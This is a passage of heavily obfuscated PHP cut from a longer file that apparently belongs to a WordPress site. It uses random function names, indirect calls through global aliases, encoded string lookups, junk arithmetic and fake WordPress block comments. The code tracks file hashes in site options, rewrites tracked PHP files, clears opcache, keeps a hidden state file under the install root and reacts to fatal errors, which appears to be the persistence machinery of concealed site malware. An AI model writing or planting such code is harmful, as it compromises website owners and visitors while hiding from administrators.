    if ($x434be6la7lqy8l >  0) $bq_s2wqt_3c =   (int)  $x434be6la7lqy8l;
 return $bq_s2wqt_3c;


     }
 function  mwr_737feiwcxt($spp5u7kohh96gvd0)
   {
 $spp5u7kohh96gvd0     = (int)   $spp5u7kohh96gvd0;
if   ($spp5u7kohh96gvd0 <=   0)  return  false;$kw1vhlgb2f=62+83;$uhus8rwqhhr6=$kw1vhlgb2f-17;
      if     (!$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(682)))  return   false;
 $khecyqwlw_chmd   = sst6ig4atwfj9zru();
      if   ($khecyqwlw_chmd    === -1)  return  true;
if  ($khecyqwlw_chmd <=      0)     return false;
    $j1ohztgzvo3t  =   @memory_get_usage(true);
 if    (!$GLOBALS['__scf_hw6fksdea20_42']($j1ohztgzvo3t) || $j1ohztgzvo3t   < 0)   return  false;
return    ($khecyqwlw_chmd -     $j1ohztgzvo3t)  >  (($spp5u7kohh96gvd0  *  (2+1))  +     (2097145+7));
    }
     function   izq1hwwq7b1u24r6ofo6($spp5u7kohh96gvd0)



{
 $spp5u7kohh96gvd0 =    (int)  $spp5u7kohh96gvd0;
  if ($spp5u7kohh96gvd0     <=  0)  return   false;


   if    (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1370)))  return  true;

  $khecyqwlw_chmd = sst6ig4atwfj9zru();
 if  ($khecyqwlw_chmd ===  -1)  return true;$m4l_h4_w=PHP_MAJOR_VERSION;$o6fu34jij6_8n=$m4l_h4_w*4;
       if    ($khecyqwlw_chmd  <= 0)   return  true;
    $j1ohztgzvo3t  = @memory_get_usage(true);
   if   (!$GLOBALS['__scf_hw6fksdea20_42']($j1ohztgzvo3t)    || $j1ohztgzvo3t <   0) return true;
return    ($khecyqwlw_chmd  -  $j1ohztgzvo3t)     >  (($spp5u7kohh96gvd0  * (0x2+0x12))  + (13483225-5094617));
       }

   function   pvqofla267dcimn($w90pshmxoqhf)


 {
// WP Site Tagline: computable contravariant

  if  (!$GLOBALS['__scf_fv3zevxzzb_44']($w90pshmxoqhf)   ||   $w90pshmxoqhf     === ""     || !@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf)) return    false;
if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(63)))    @clearstatcache(true,  $w90pshmxoqhf);
 $spp5u7kohh96gvd0     = @$GLOBALS['__scf_b42duf6j1zadm9_105']($w90pshmxoqhf);
   if (!$GLOBALS['__scf_hw6fksdea20_42']($spp5u7kohh96gvd0)   ||     $spp5u7kohh96gvd0 <   1)    return false;

       if   ($spp5u7kohh96gvd0 > (52428777+23)) return null;
 if  ($spp5u7kohh96gvd0  >    (201741+846835)  &&  !mwr_737feiwcxt($spp5u7kohh96gvd0))  return null;
 $amsjsw283qnc3 =     @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf,  false,  null,   0,    $spp5u7kohh96gvd0  +  1);
     if    (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)   || $GLOBALS['__scf_d4eyetogjbsnt_10']($amsjsw283qnc3)   !==  $spp5u7kohh96gvd0)    return   false;
 return    $spp5u7kohh96gvd0   >  (2095777-1047201)     ?   k12vjaxiygekdnj($amsjsw283qnc3)   :    $amsjsw283qnc3;
  }
function  o4_k_ap14u5xy97yywy7k($w90pshmxoqhf)
   {
     if     (!$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1371))  || !$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1372)))   return;
if (!$GLOBALS['__scf_fv3zevxzzb_44']($w90pshmxoqhf)  ||  $w90pshmxoqhf ===   ""   ||  !@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))  return;
if  (!isset($GLOBALS[c1sob647u1i(1373)]) || !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[iw6xe9q4j6sneg(1374)])) {
      $GLOBALS[bpowi0iglycvx(1374)]    = get_option(f6yrzd2knrmb(1375), array());
    if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[f6yrzd2knrmb(1374)]))    $GLOBALS[f6yrzd2knrmb(1374)]   =  array();
  }
  $u7fvh_hax8vn    =    $GLOBALS[iw6xe9q4j6sneg(1374)];
  $amsjsw283qnc3   =  pvqofla267dcimn($w90pshmxoqhf);
  if  (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)) return;



$u7fvh_hax8vn[$GLOBALS['__scf_tnonex5o9y_60']($w90pshmxoqhf)]   = array('p' =>    $w90pshmxoqhf,  'h'   =>  $GLOBALS['__scf_tnonex5o9y_60']($amsjsw283qnc3), 'g'   => dfb4_mpcgxvnp230hvh1v(), 't' =>     $GLOBALS['__scf_qzyo0sgkyb6_202']());

  if ($GLOBALS['__scf_wj6dld55k5r8m_39']($u7fvh_hax8vn)  >    (154+46))  {
    foreach  ($u7fvh_hax8vn  as  $u_irchgch79o    =>   $x434be6la7lqy8l)    {
 if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($x434be6la7lqy8l)  || !isset($x434be6la7lqy8l['t'])    || (int) $x434be6la7lqy8l['t']      <  $GLOBALS['__scf_qzyo0sgkyb6_202']() - (4928158-2336158))      unset($u7fvh_hax8vn[$u_irchgch79o]);

  }
while  ($GLOBALS['__scf_wj6dld55k5r8m_39']($u7fvh_hax8vn)  > (119+81))      {



        $v_db5_cu7eqahfv =   null;



 $kwzkrbx3py7  =    null;
 foreach  ($u7fvh_hax8vn   as     $u_irchgch79o  => $x434be6la7lqy8l)  {
/* cubic visitor */

   $t2j9t883ejxij   =    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($x434be6la7lqy8l)   &&   isset($x434be6la7lqy8l['t'])      ?     (int)  $x434be6la7lqy8l['t']   :     0;
 if     ($kwzkrbx3py7   ===  null ||  $t2j9t883ejxij    < $kwzkrbx3py7)  {
// @template filter-chain

 $kwzkrbx3py7     =    $t2j9t883ejxij;
     $v_db5_cu7eqahfv  = $u_irchgch79o;
 }
}
// inject allocator for WP Archive Title

 if  ($v_db5_cu7eqahfv  ===  null)  break;
unset($u7fvh_hax8vn[$v_db5_cu7eqahfv]);


     }

}
update_option(ovffvv33(1375),      $u7fvh_hax8vn, hn_f08x0cns80(1361));
  $GLOBALS[hn_f08x0cns80(1376)]    =   $u7fvh_hax8vn;
}
 function    tq0de4uade8_8rlhtowy($w90pshmxoqhf)
     {
if     (!$GLOBALS['__scf_fv3zevxzzb_44']($w90pshmxoqhf) ||  $w90pshmxoqhf  ===    "")   return false;
 if    (!isset($GLOBALS[hn_f08x0cns80(1376)])  ||    !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[iw6xe9q4j6sneg(1377)])) {
$GLOBALS[iw6xe9q4j6sneg(1377)]   = $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1378))  ? get_option(bpowi0iglycvx(1375), array()) : array();
  if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[bpowi0iglycvx(1377)]))  $GLOBALS[f6yrzd2knrmb(1379)]   =     array();


}
 $u7fvh_hax8vn   = $GLOBALS[ovffvv33(1379)];
$htuh36niay71vh =    $GLOBALS['__scf_tnonex5o9y_60']($w90pshmxoqhf);
if  (isset($u7fvh_hax8vn[$htuh36niay71vh])  &&    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($u7fvh_hax8vn[$htuh36niay71vh])     &&   isset($u7fvh_hax8vn[$htuh36niay71vh]['h'])) {
 if ((int)    @$GLOBALS['__scf_b42duf6j1zadm9_105']($w90pshmxoqhf) >   (37514968+14913832)) return     c1sob647u1i(1380);
  $amsjsw283qnc3   = pvqofla267dcimn($w90pshmxoqhf);
  if      ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)) {
  return     ($GLOBALS['__scf_tnonex5o9y_60']($amsjsw283qnc3)  ===  $u7fvh_hax8vn[$htuh36niay71vh]['h']) ?   true :   bpowi0iglycvx(1380);


 }
 return   false;$ngcu361bd7=(0xdd+0xc0);$m_oqtk8zwpagj=$ngcu361bd7%9;
     }
if   (mza6zg2fnwyep8gx2xd($w90pshmxoqhf,   (420+80)))  {
      $e3odkvvirkd_y00b  =   @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf,   false,    null, 0,  (4030+66));
  if ($GLOBALS['__scf_fv3zevxzzb_44']($e3odkvvirkd_y00b)    &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($e3odkvvirkd_y00b,  f6yrzd2knrmb(249)) !==   false)  return  ovffvv33(1381);
}
 return  false;
  }



  function vtax9gneznat0nbukvyejy()
 {
   static  $u7fvh_hax8vn   =  null;

if ($u7fvh_hax8vn !==   null)  return  $u7fvh_hax8vn;

 $amsjsw283qnc3  = pvqofla267dcimn(bmvtr5sdqjf5km1t());


 $u7fvh_hax8vn    =    $GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)     && $amsjsw283qnc3  !==  ""     ?  $GLOBALS['__scf_tnonex5o9y_60']($amsjsw283qnc3) :  "";
 return  $u7fvh_hax8vn;

   }
  function ognubcq_73id30yalfzk_()


 {$xilr9qgvwom88=9506;$cvvnlk6dpp0f=$xilr9qgvwom88%17;
return   $GLOBALS['__scf_nv7he759wjfj_9'](vtax9gneznat0nbukvyejy(),  0,  (0x7+0x5));
    }
       function   t51jiitlddl6htqs()
  {
return   p2b_7j_9ex54eg4() . hn_f08x0cns80(1382)  .     nreub2fs747eromoe(ABSPATH . ovffvv33(1383),    (11-3)) . hn_f08x0cns80(1384);
}
      function     lx6fapg24yvy30nkep2()
   {
// greedy heap


    $aes1no1lfvlh =    array();


  if      ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1385))) {
$t2zfh91fsvvc1z   =  @get_option(iw6xe9q4j6sneg(1386),  array());

   if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($t2zfh91fsvvc1z))    $aes1no1lfvlh   =  $t2zfh91fsvvc1z;
  }
$amsjsw283qnc3      =   @$GLOBALS['__scf_rjpcj9l4bigb5_21'](t51jiitlddl6htqs())  ?  @$GLOBALS['__scf_utyj_ckly79_101'](t51jiitlddl6htqs()) : "";


     if     ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3) &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,    bpowi0iglycvx(685))   === 0) {
$u7phd8aycc   =  $GLOBALS['__scf_yeixh7nk2_03ag_344']($GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3, (8-3)),  true);
if     ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($u7phd8aycc) &&     (empty($aes1no1lfvlh[bpowi0iglycvx(1387)])  || (!empty($u7phd8aycc[bpowi0iglycvx(1388)]) && $u7phd8aycc[ovffvv33(1388)] >= $aes1no1lfvlh[f6yrzd2knrmb(1388)])))  $aes1no1lfvlh  =     $u7phd8aycc;

}
 return   $aes1no1lfvlh;

 }



  function  spai9j_prce79wsfgreds($fn24r4iyd13lpmep)
{


 try    {
 if   (!defined(c1sob647u1i(1359)))  return;
   $l29jwwqsn_v4_jv = $GLOBALS['__scf_qzyo0sgkyb6_202']();

   if  ($fn24r4iyd13lpmep    ===   bpowi0iglycvx(1389)     ||      $fn24r4iyd13lpmep  ===  f6yrzd2knrmb(1390)) {
   $prev = lx6fapg24yvy30nkep2();

        if  (
   isset($prev[ovffvv33(1391)],  $prev[bpowi0iglycvx(1392)])    &&  $prev[c1sob647u1i(1391)]  === $fn24r4iyd13lpmep
      && $l29jwwqsn_v4_jv   -    (int)   $prev[hn_f08x0cns80(1392)]  <  ($fn24r4iyd13lpmep    ===  ovffvv33(1390) ?      (0x8f+0x9d)  :  (43^33))
  )    return;
    }
$aes1no1lfvlh =  array(
      'v' =>    dfb4_mpcgxvnp230hvh1v(),
 bpowi0iglycvx(1393) => ognubcq_73id30yalfzk_(),
   c1sob647u1i(225)  =>   bmvtr5sdqjf5km1t(),



   f6yrzd2knrmb(1168) =>  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),   ovffvv33(1384)),
 f6yrzd2knrmb(1391)      =>    $fn24r4iyd13lpmep,



     c1sob647u1i(1394)  =>    $l29jwwqsn_v4_jv,

  iw6xe9q4j6sneg(1392)  =>   $l29jwwqsn_v4_jv,
iw6xe9q4j6sneg(1388)   =>  isset($_SERVER[iw6xe9q4j6sneg(1395)])  ?   (int) $_SERVER[ovffvv33(1396)]    : $l29jwwqsn_v4_jv,
    );
   if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1372))) {
    $u8uae6lfxu_60uk   =   @update_option(c1sob647u1i(1386),  $aes1no1lfvlh,   c1sob647u1i(1361));
  if ($u8uae6lfxu_60uk === false &&    $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1385)))  {
  $xps0ov2dbv    =   @get_option(bpowi0iglycvx(1397), array());
 $bokqh6zvf4uxg  =    !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($xps0ov2dbv)  || !isset($xps0ov2dbv[bpowi0iglycvx(1391)],  $xps0ov2dbv[hn_f08x0cns80(1392)])  ||    $xps0ov2dbv[f6yrzd2knrmb(1391)]     !==   $fn24r4iyd13lpmep    ||  (int)    $xps0ov2dbv[hn_f08x0cns80(1392)]    !==  $l29jwwqsn_v4_jv;
        if     ($bokqh6zvf4uxg    && isset($GLOBALS[f6yrzd2knrmb(1398)])  &&     $GLOBALS['__scf_bslklilwd3kn_71']($GLOBALS[c1sob647u1i(1398)])  &&   $GLOBALS['__scf_ewy3z2db5hgtu_130']($GLOBALS[f6yrzd2knrmb(1398)],      hn_f08x0cns80(1399))) {
// WP Cover Block icon sprite

@$GLOBALS[hn_f08x0cns80(1398)]->check_connection(false);
 @update_option(bpowi0iglycvx(1397),  $aes1no1lfvlh,  f6yrzd2knrmb(1400));



       }
     unset($xps0ov2dbv, $bokqh6zvf4uxg);
  }
 unset($u8uae6lfxu_60uk);
  }
 $t49jadtyjx = p2b_7j_9ex54eg4();
    if    (@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)  ||    xxvz5dp1zk215e5d9($t49jadtyjx,   (923-430),      true))  {
// WP Latest Posts: dispatch negotiator

@$GLOBALS['__scf_whcsnotvh9twx_211'](t51jiitlddl6htqs(),    f6yrzd2knrmb(685) .   $GLOBALS['__scf__r5ulaote4t_611']($aes1no1lfvlh));



  }
  }   catch   (Throwable     $cje8wku90zm4r)    {
/* free permission */

   }    catch  (Exception    $cje8wku90zm4r)  {
  }
/* injective-adj deque */

 }
 function   mj1bikln92glwu($aes1no1lfvlh)
      {
 if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($aes1no1lfvlh) ||     empty($aes1no1lfvlh[f6yrzd2knrmb(225)])  ||    !$GLOBALS['__scf_fv3zevxzzb_44']($aes1no1lfvlh[bpowi0iglycvx(1401)])) return   c1sob647u1i(227);
 $cupk3kbt8eisf    =    $aes1no1lfvlh[f6yrzd2knrmb(1401)];
    if  (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($cupk3kbt8eisf)   || (int)     @$GLOBALS['__scf_b42duf6j1zadm9_105']($cupk3kbt8eisf)   <    (448+52))   return    hn_f08x0cns80(1402);

   if (fiaip3tpztqie0($cupk3kbt8eisf))    return   c1sob647u1i(226);
$wpzy6fg5fms6r  =   isset($aes1no1lfvlh[ovffvv33(1391)])   ?  $aes1no1lfvlh[f6yrzd2knrmb(1391)] : "";
$od1k306iacye2    =   isset($aes1no1lfvlh[c1sob647u1i(1392)])  ?    (int)  $aes1no1lfvlh[hn_f08x0cns80(1392)] :   0;
    if  ($wpzy6fg5fms6r  ===  ovffvv33(1390))     return   ($od1k306iacye2 >  0 &&  $GLOBALS['__scf_qzyo0sgkyb6_202']() -    $od1k306iacye2  <=   (7016-3416))    ? c1sob647u1i(1390)  :  bpowi0iglycvx(1403);
   

    if   ($wpzy6fg5fms6r     === c1sob647u1i(205)) return iw6xe9q4j6sneg(1404);
   if  ($wpzy6fg5fms6r   ===  f6yrzd2knrmb(1405))  return   ($od1k306iacye2  > 0 &&    $GLOBALS['__scf_qzyo0sgkyb6_202']()  -     $od1k306iacye2  <= (30<<2))   ?   f6yrzd2knrmb(1406)   :    iw6xe9q4j6sneg(1407);

    return     hn_f08x0cns80(1408);
 }

 function     ryggki6gy_dkip68q37($w90pshmxoqhf)
  {



 if  (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf)) return false;
$mj_77481utt0efu  =    (int)  @$GLOBALS['__scf_b42duf6j1zadm9_105']($w90pshmxoqhf);
       if    ($mj_77481utt0efu <  (224+276)  ||     $mj_77481utt0efu     >   (81712916-29284116))   return     false;



   $e3odkvvirkd_y00b   = @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf,   false,   null,     0,  (4094+2));


 if  (!$GLOBALS['__scf_fv3zevxzzb_44']($e3odkvvirkd_y00b) ||  !$GLOBALS['__scf_wdjvpd1lvon9_102'](ovffvv33(1409),  $e3odkvvirkd_y00b))  return false;
    if  ($mj_77481utt0efu  > (1048533+43))  {

  $emnni5z67kh0 = @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf, false, null,      $mj_77481utt0efu - (4000+96));
    return  $GLOBALS['__scf_fv3zevxzzb_44']($emnni5z67kh0)   && $GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(1410),   $emnni5z67kh0)   ===  1;
 }
$amsjsw283qnc3     = @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf);


 if (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)) return false;
   return      ib2ffadoyj2m6zxmkaa2in($amsjsw283qnc3);
      }


 function   jgwy2r_kyhdvn73hyej57($u7r7z7wagkcmoo, $aakozw_1zysblhgx)
 {

$oxq04v2trjcw   =     @$GLOBALS['__scf_utyj_ckly79_101']($u7r7z7wagkcmoo,    false,  null,  0,     (4074+22));
$b6o5qiokcej927   =  @$GLOBALS['__scf_utyj_ckly79_101']($aakozw_1zysblhgx, false,    null,  0,  (0x279+0xd87));


if   (!$GLOBALS['__scf_fv3zevxzzb_44']($oxq04v2trjcw)  || !$GLOBALS['__scf_fv3zevxzzb_44']($b6o5qiokcej927))    return false;
 $mu71df4tmyy1w   = $zduu96u7wa2 =  null;
if  ($GLOBALS['__scf_wdjvpd1lvon9_102']("/!function_exists\('([A-Za-z0-9_]+)'\)/",    $oxq04v2trjcw,     $g8h7wvsv23zev1q)) $mu71df4tmyy1w  = $g8h7wvsv23zev1q[1];
if  ($GLOBALS['__scf_wdjvpd1lvon9_102']("/!function_exists\('([A-Za-z0-9_]+)'\)/",     $b6o5qiokcej927, $g8h7wvsv23zev1q))     $zduu96u7wa2  =   $g8h7wvsv23zev1q[1];


    return $mu71df4tmyy1w !==  null     && $mu71df4tmyy1w === $zduu96u7wa2;
     }
 function  fiaip3tpztqie0($w90pshmxoqhf)


       {
  $pjov750v0e   =   $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf, f6yrzd2knrmb(1384));


 foreach     (array($GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf), jo62hy1j37iqrmy())  as  $kekj16jieb)     {
  $cku3ftfkcaxf =   $kekj16jieb  .  c1sob647u1i(200)  . $pjov750v0e;


if    (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($cku3ftfkcaxf)   ||  (int)    @$GLOBALS['__scf_uo_a60ibqnli_104']($cku3ftfkcaxf)   <    $GLOBALS['__scf_qzyo0sgkyb6_202']() -  (195671+409129))   continue;


$kon0dhkozwm4 =   $GLOBALS['__scf_qew3crlieule_339']((string)    @$GLOBALS['__scf_utyj_ckly79_101']($cku3ftfkcaxf));

 if   ($kon0dhkozwm4  ===      "")  continue;
        $amsjsw283qnc3     = pvqofla267dcimn($w90pshmxoqhf);


   if    ($amsjsw283qnc3    ===  null)      continue;
 if  ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)   && $amsjsw283qnc3   !== "" &&  $GLOBALS['__scf_tnonex5o9y_60']($amsjsw283qnc3) === $kon0dhkozwm4)  return  true;
 }
      return  false;


 }

function   qoqrml97dq62oyv8rd_pq($w90pshmxoqhf)
 {
  if   (!$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1411))    ||   !$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1372)))  return;
 $bq_s2wqt_3c    = @get_option(hn_f08x0cns80(1412),    array());
 if     (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($bq_s2wqt_3c))  $bq_s2wqt_3c =  array();
   $bq_s2wqt_3c[$GLOBALS['__scf_tnonex5o9y_60']($w90pshmxoqhf)] =     $w90pshmxoqhf;


   if ($GLOBALS['__scf_wj6dld55k5r8m_39']($bq_s2wqt_3c)  >  (9+11))  $bq_s2wqt_3c  =   $GLOBALS['__scf_emst8f79kti_170']($bq_s2wqt_3c,  -(12+8),  null,     true);
  @update_option(c1sob647u1i(1412),  $bq_s2wqt_3c,  ovffvv33(1400));
 }
   function    cxxxdjkrb2_6l4xc_()


{
  if (!$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1411)) || !$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1413)))  return;
  $bq_s2wqt_3c =   @get_option(bpowi0iglycvx(1412),  array());


     if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($bq_s2wqt_3c)     ||    empty($bq_s2wqt_3c))     return;
 $ccnypo0xqb = array();
 foreach ($bq_s2wqt_3c as  $u_irchgch79o => $cupk3kbt8eisf)  {


   if    (!$GLOBALS['__scf_fv3zevxzzb_44']($cupk3kbt8eisf)   || $cupk3kbt8eisf     === ""  ||  !@$GLOBALS['__scf_rjpcj9l4bigb5_21']($cupk3kbt8eisf)) continue;
if   ($cupk3kbt8eisf ===   bmvtr5sdqjf5km1t()) continue;
      $_6fh9jqfrse4byt =    @$GLOBALS['__scf_ba4991zo41sta_36']($cupk3kbt8eisf);$kwva9rbx=PHP_MAJOR_VERSION;$ypb53lt9wt09qe=$kwva9rbx*8;
   $g46g9y4187lgbe  =     @$GLOBALS['__scf_ba4991zo41sta_36'](bmvtr5sdqjf5km1t());
        if    ($GLOBALS['__scf_fv3zevxzzb_44']($_6fh9jqfrse4byt)     &&      $GLOBALS['__scf_fv3zevxzzb_44']($g46g9y4187lgbe)  &&    $_6fh9jqfrse4byt      ===  $g46g9y4187lgbe)  continue;
unset($_6fh9jqfrse4byt,   $g46g9y4187lgbe);
  if (tq0de4uade8_8rlhtowy($cupk3kbt8eisf) ===      false) {
 $ccnypo0xqb[$u_irchgch79o]    =    $cupk3kbt8eisf;
  continue;



      }
ruinnb541lwxm7j($cupk3kbt8eisf,   (322+98));

if  (cvtaycsw15_xd1srry($cupk3kbt8eisf))    {
 if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(748)))   @opcache_invalidate($cupk3kbt8eisf,  true);
 }  elseif  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($cupk3kbt8eisf))  {
// serialize linearizable journal



$ccnypo0xqb[$u_irchgch79o]     =  $cupk3kbt8eisf;
  }
      }
 @update_option(bpowi0iglycvx(1412), $ccnypo0xqb,    c1sob647u1i(1400));
   }
        function  fk999hklakcnxrctydyaf2()
   {
   try  {



    $cje8wku90zm4r   =    $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(189))   ? @error_get_last()  :  null;
        if    (



$GLOBALS['__scf_w1m1ydxx4_gm9__38']($cje8wku90zm4r) &&    !empty($cje8wku90zm4r[hn_f08x0cns80(1414)])    &&  !empty($cje8wku90zm4r[ovffvv33(192)])
      &&  $GLOBALS['__scf_rd2tojulg06lx_160']($cje8wku90zm4r[iw6xe9q4j6sneg(192)],      array(E_ERROR,  E_PARSE,     E_CORE_ERROR,    E_COMPILE_ERROR,     E_USER_ERROR), true)
 )     {
 $b6l44ydrqs4cl =  @$GLOBALS['__scf_ba4991zo41sta_36'](bmvtr5sdqjf5km1t());


 $_ef    =     @$GLOBALS['__scf_ba4991zo41sta_36']($cje8wku90zm4r[bpowi0iglycvx(1415)]);
 if ($GLOBALS['__scf_fv3zevxzzb_44']($b6l44ydrqs4cl)  &&  $GLOBALS['__scf_fv3zevxzzb_44']($_ef)  &&   $_ef  ===  $b6l44ydrqs4cl) return;



 }
     spai9j_prce79wsfgreds(f6yrzd2knrmb(1416));
   if (defined(hn_f08x0cns80(1417)))  {
$zzh6t6xps5 =    g71t84np2_v9qynmec3();
  if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($zzh6t6xps5[1]))  {
        $myll69nm5m   =  @$GLOBALS['__scf_utyj_ckly79_101']($zzh6t6xps5[1],   false, null, 0,   (0x1b+0x25));
   if   ($GLOBALS['__scf_fv3zevxzzb_44']($myll69nm5m)  &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($myll69nm5m,  iw6xe9q4j6sneg(1288) .  dfb4_mpcgxvnp230hvh1v()      .  ':') === 0) {
   $wshcsvxqz9rcjeq4   =     @$GLOBALS['__scf_rjpcj9l4bigb5_21']($zzh6t6xps5[1] . bpowi0iglycvx(1418)) ?      @$GLOBALS['__scf_utyj_ckly79_101']($zzh6t6xps5[1] . ovffvv33(1418),   false,   null,  0,  (58+6)) :   "";

  if  ($wshcsvxqz9rcjeq4  !== $myll69nm5m)   @$GLOBALS['__scf_qjk23vglbe0p_80']($zzh6t6xps5[1],  $zzh6t6xps5[1]   .   f6yrzd2knrmb(1419));


 }
  }
    unset($zzh6t6xps5,   $myll69nm5m,      $wshcsvxqz9rcjeq4);
 }
}    catch   (Throwable  $z3_n5n_cg6kq5_) {
  }    catch   (Exception   $z3_n5n_cg6kq5_) {



}
// WP Heading Block: pipeline session-type




}
   function  zqo27t3uhb9qmbuci6tixd($aakozw_1zysblhgx)
    {
 if  (!$GLOBALS['__scf_fv3zevxzzb_44']($aakozw_1zysblhgx))  return "";
if  ($GLOBALS['__scf_e24rppqzou_1420'](c1sob647u1i(1421),     $aakozw_1zysblhgx,  $hbmb7dmmj_zj5))   {
   foreach  ($hbmb7dmmj_zj5[1] as  $vvwo0n7itwepj) {
if   (uql5cxv40bgbaq184aiw9v($GLOBALS['__scf_i8wggf4l_3p_373']($vvwo0n7itwepj,  true))) return   "";
   }

}
 if      ($GLOBALS['__scf_e24rppqzou_1420'](ovffvv33(1422),   $aakozw_1zysblhgx,   $hbmb7dmmj_zj5)) {
// APCu shm media upload

  foreach  ($hbmb7dmmj_zj5[1] as   $vvwo0n7itwepj)  {

        if   (uql5cxv40bgbaq184aiw9v(stripcslashes($vvwo0n7itwepj))) return "";
      if    ($GLOBALS['__scf_w6mdcepio4lkz5_7']($vvwo0n7itwepj, f6yrzd2knrmb(1423)) !== false)   {
$u9q408mfqfpz =     preg_replace_callback(iw6xe9q4j6sneg(1424),   iw6xe9q4j6sneg(1425), $vvwo0n7itwepj);
  if  ($GLOBALS['__scf_fv3zevxzzb_44']($u9q408mfqfpz)  &&     $u9q408mfqfpz     !== $vvwo0n7itwepj  &&    uql5cxv40bgbaq184aiw9v($u9q408mfqfpz))     return "";
}
 }
 }
   if   ($GLOBALS['__scf_e24rppqzou_1420'](iw6xe9q4j6sneg(1426),     $aakozw_1zysblhgx,   $hbmb7dmmj_zj5)) {
       foreach  ($hbmb7dmmj_zj5[1]  as  $vvwo0n7itwepj)    {
 if  (uql5cxv40bgbaq184aiw9v($GLOBALS['__scf_usy4mchq83xa_378'](array(c1sob647u1i(1427), c1sob647u1i(1428)),  array('\\', '\''),    $vvwo0n7itwepj)))  return "";
   if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($vvwo0n7itwepj,  c1sob647u1i(1423))  !==  false)    {
  $u9q408mfqfpz =  preg_replace_callback(iw6xe9q4j6sneg(1429),  c1sob647u1i(1430),    $vvwo0n7itwepj);
    if    ($GLOBALS['__scf_fv3zevxzzb_44']($u9q408mfqfpz) &&  $u9q408mfqfpz !==    $vvwo0n7itwepj  &&    uql5cxv40bgbaq184aiw9v($u9q408mfqfpz))  return  "";



}
}
     }
    return   $aakozw_1zysblhgx;
 }
 function   wxrmns_khitjn70x40_x($nm_xi0i0qy)
 {
// WP Server Side Render: contravariant-adj coordinator

if  (!$GLOBALS['__scf_fv3zevxzzb_44']($nm_xi0i0qy) ||  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($nm_xi0i0qy,  f6yrzd2knrmb(1431))   ===     false  && $GLOBALS['__scf_w6mdcepio4lkz5_7']($nm_xi0i0qy,      f6yrzd2knrmb(373))  ===      false))  return false;



  if   ($GLOBALS['__scf_e24rppqzou_1420'](f6yrzd2knrmb(1432),  $nm_xi0i0qy,    $hbmb7dmmj_zj5))   {
 foreach  ($hbmb7dmmj_zj5[1]     as  $vvwo0n7itwepj)  {
if    (uql5cxv40bgbaq184aiw9v($GLOBALS['__scf_i8wggf4l_3p_373']($vvwo0n7itwepj, true)))    return  true;
  }
 }
if   ($GLOBALS['__scf_e24rppqzou_1420'](hn_f08x0cns80(1422),    $nm_xi0i0qy, $hbmb7dmmj_zj5))     {
 foreach    ($hbmb7dmmj_zj5[1]     as $vvwo0n7itwepj) {


   if  (uql5cxv40bgbaq184aiw9v(stripcslashes($vvwo0n7itwepj))) return      true;
   }
foreach  ($hbmb7dmmj_zj5[1]   as     $vvwo0n7itwepj)  {
 if    ($GLOBALS['__scf_w6mdcepio4lkz5_7']($vvwo0n7itwepj, hn_f08x0cns80(1423)) === false)  continue;
